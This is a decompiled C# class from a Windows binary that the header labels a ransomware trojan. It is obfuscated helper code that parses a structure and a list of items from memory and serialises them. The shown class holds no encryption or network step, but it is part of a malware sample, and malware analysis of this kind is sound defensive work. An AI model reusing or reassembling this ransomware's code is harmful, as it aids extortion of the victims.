// Decompiled with JetBrains decompiler
// Type: ns4.Class5`1
// Assembly: TRM, Version=1.0.4536.20171, Culture=neutral, PublicKeyToken=null
// MVID: AA83BB74-0A66-4BAC-8184-D7E3DA7EFE4C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.07\HEUR-Trojan-Ransom.Win32.Generic-26680280de8156494a34717623fa44dd8b6e6c766697b964f261c09185d29443.exe

using ns0;
using ns1;
using ns3;
using ns7;
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;

namespace ns4
{
  internal class Class5<T> : Class0 where T : Class3, new()
  {
    private Class38.Struct5 struct5_0 = new Class38.Struct5();
    private List<T> list_0 = new List<T>();

    internal Class5(
      IntPtr intptr_2,
      IntPtr intptr_3,
      Class40 class40_2,
      Class40 class40_3,
      ushort ushort_1,
      int int_1)
      : base(intptr_2, intptr_3, class40_2, class40_3, ushort_1, int_1)
    {
    }

    public Class5(Class38.Enum6 enum6_0)
      : base(IntPtr.Zero, IntPtr.Zero, new Class40(enum6_0), new Class40(1U), Class15.smethod_7(), Marshal.SizeOf(typeof (Class38.Struct5)))
    {
      switch (enum6_0)
      {
        case Class38.Enum6.const_11:
          this.struct5_0.ushort_1 = (ushort) 2;
          break;
        case Class38.Enum6.const_12:
          this.struct5_0.ushort_1 = (ushort) 1;
          break;
        default:
          throw new NotSupportedException();
      }
    }

    public override void vmethod_2(string string_0)
    {
      base.vmethod_2(string_0);
      foreach (T obj in this.list_0)
        obj.vmethod_5(string_0);
    }

    internal override IntPtr vmethod_0(IntPtr intptr_2, IntPtr intptr_3)
    {
      this.list_0.Clear();
      this.struct5_0 = (Class38.Struct5) Marshal.PtrToStructure(intptr_3, typeof (Class38.Struct5));
      IntPtr intptr_3_1 = new IntPtr(intptr_3.ToInt32() + Marshal.SizeOf((object) this.struct5_0));
      for (ushort index = 0; (int) index < (int) this.struct5_0.ushort_2; ++index)
      {
        T obj = new T();
        intptr_3_1 = obj.vmethod_0(intptr_2, intptr_3_1);
        this.list_0.Add(obj);
      }
      return intptr_3_1;
    }

    internal override void vmethod_1(BinaryWriter binaryWriter_0)
    {
      binaryWriter_0.Write(this.struct5_0.ushort_0);
      binaryWriter_0.Write(this.struct5_0.ushort_1);
      binaryWriter_0.Write((ushort) this.list_0.Count);
      Class15.smethod_1(binaryWriter_0);
      foreach (T obj in this.list_0)
        obj.vmethod_1(binaryWriter_0);
    }
  }
}
